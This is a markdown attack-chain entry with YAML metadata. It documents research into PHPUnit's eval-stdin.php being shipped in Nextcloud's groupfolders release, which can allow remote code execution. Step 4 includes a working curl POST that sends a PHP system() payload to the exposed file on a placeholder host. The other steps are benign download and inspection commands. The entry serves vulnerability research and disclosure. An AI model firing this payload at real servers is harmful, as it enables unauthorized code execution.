---
id: ac-nextcloud-phpunit-rce
tags:
  - rce
  - nextcloud
  - phpunit
  - supply-chain
  - php
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Download-and-Inspect-Groupfolders-Release-Tarball]]'
  - '[[procedures/Identify-PHPUnit-in-Vendor-Directory]]'
  - '[[procedures/Analyze-eval-stdin.php-for-RCE-Risk]]'
  - '[[procedures/Test-Accessibility-of-eval-stdin.php]]'
  - '[[procedures/Check-Other-Nextcloud-Apps-for-Similar-Issues]]'
step_count: 5
techniques:
  - '[[Supply Chain Compromise]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:27.834Z'
description: >-
  A vulnerability research chain identifying and analyzing the inclusion of
  PHPUnit's eval-stdin.php in Nextcloud's groupfolders app production release,
  leading to potential RCE if the file is web-accessible.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Supply Chain Compromise]]'
  - '[[Command-Line Interface]]'
---
# Remote Code Execution via PHPUnit eval-stdin.php Inclusion in Nextcloud Groupfolders App

Multi-stage vulnerability research chain demonstrating the discovery of a potential RCE vulnerability due to the accidental inclusion of PHPUnit testing code in the production release of Nextcloud's groupfolders app. The chain involves downloading and inspecting the release package, identifying risky dependencies, analyzing the vulnerable file, testing for exposure, and checking for similar issues in related apps. This could allow attackers to execute arbitrary PHP code via php://stdin in CGI/FastCGI environments if the file is accessible without authentication.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Download Release] --> B[Identify PHPUnit]
    B --> C[Analyze eval-stdin.php]
    C --> D[Test Accessibility]
    D --> E[Check Other Apps]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser or [[commands/wget-download]]
- Archive extraction tools like tar

### Target Environment

- Access to Nextcloud app releases on GitHub
- PHP environment for testing (CGI/FastCGI optional for verification)
- No special credentials needed for public releases

### Initial Access Requirements

- Internet access to download public tarballs
- Basic knowledge of PHP and web server configurations
- No prior authentication or network position required

## Detailed Attack Procedures

### Step 1: Download and Inspect Groupfolders Release Tarball
procedure: [[procedures/Download-and-Inspect-Groupfolders-Release-Tarball]]

**Objective**: Obtain the production release package to begin vulnerability inspection.

**Instructions**: Use [[commands/wget-download]] to fetch the tarball from the GitHub releases page:

```bash
wget https://github.com/nextcloud/groupfolders/releases/download/v6.0.2/groupfolders.tar.gz
```

Then extract and list contents using standard tar commands:

```bash
tar -xzf groupfolders.tar.gz
ls -la
```

**Expected Output**: Extracted directory structure revealing the app files, including vendor folder.

**Success Indicators**:
- Tarball downloaded successfully
- Files extracted without errors

### Step 2: Identify PHPUnit in Vendor Directory
procedure: [[procedures/Identify-PHPUnit-in-Vendor-Directory]]

**Objective**: Locate development dependencies in the production package that pose security risks.

**Instructions**: Navigate to the vendor directory and search for PHPUnit:

```bash
find . -name "*phpunit*" -type d
ls vendor/phpunit/
```

Reference external resources for known risks, such as browsing to https://thephp.cc/news/2020/02/phpunit-a-security-risk.

**Expected Output**: PHPUnit directories and files listed in vendor/phpunit.

**Success Indicators**:
- PHPUnit folder confirmed in vendor
- Relevant files like src/Util/PHP/eval-stdin.php identified

### Step 3: Analyze eval-stdin.php for RCE Risk
procedure: [[procedures/Analyze-eval-stdin.php-for-RCE-Risk]]

**Objective**: Examine the specific file for exploitable code execution behavior.

**Instructions**: View the contents of the eval-stdin.php file:

```bash
cat vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
```

Analyze for eval() usage on php://stdin, cross-referencing with PHP documentation and past incidents like PrestaShop.

**Expected Output**: Code snippet showing eval('?>' . file_get_contents('php://stdin')) or similar.

**Success Indicators**:
- Confirmation of arbitrary code evaluation from stdin
- Understanding of CGI/FastCGI exploitation vector

### Step 4: Test Accessibility of eval-stdin.php
procedure: [[procedures/Test-Accessibility-of-eval-stdin.php]]

**Objective**: Verify if the vulnerable file can be accessed directly in a deployed Nextcloud instance.

**Instructions**: In a test Nextcloud setup without URL rewriting, attempt to access the file via browser or curl:

```bash
curl -X POST http://nextcloud.example.com/groupfolders/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -d '<?php system("id"); ?>'
```

Test without authentication to check exposure.

**Expected Output**: Potential PHP execution output if vulnerable, or 404/denied if protected.

**Success Indicators**:
- File accessible via direct URL
- POST payload evaluated (if exploitable)

### Step 5: Check Other Nextcloud Apps for Similar Issues
procedure: [[procedures/Check-Other-Nextcloud-Apps-for-Similar-Issues]]

**Objective**: Extend the research to identify widespread inclusion of risky dependencies.

**Instructions**: Download and inspect tarballs for other apps like carnet, discoursesso, and extract:

```bash
wget https://github.com/nextcloud/carnet/releases/download/vX.Y.Z/carnet.tar.gz
# Repeat for discoursesso and extract, then search for phpunit
find . -name "*phpunit*"
```

Visit app pages: https://apps.nextcloud.com/apps/carnet, etc.

**Expected Output**: Confirmation of PHPUnit in vendor directories of additional apps.

**Success Indicators**:
- Similar vulnerabilities found in multiple apps
- Reportable patterns identified

## Attack Chain Summary

### Key Achievements

1. Discovered unintended inclusion of PHPUnit in production releases
2. Analyzed RCE potential via eval-stdin.php in CGI/FastCGI setups
3. Identified exposure risks in Nextcloud app deployments
4. Extended findings to other apps like carnet, discoursesso, and extract
5. Highlighted supply chain risks in open-source app packaging

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Supply Chain Compromise]] Supply Chain Compromise
- [[Command-Line Interface]] Command and Scripting Interpreter

### MITRE ATT&CK Tactics

- [[Execution]] Execution

*Last updated: 2023-10-01T00:00:00Z*
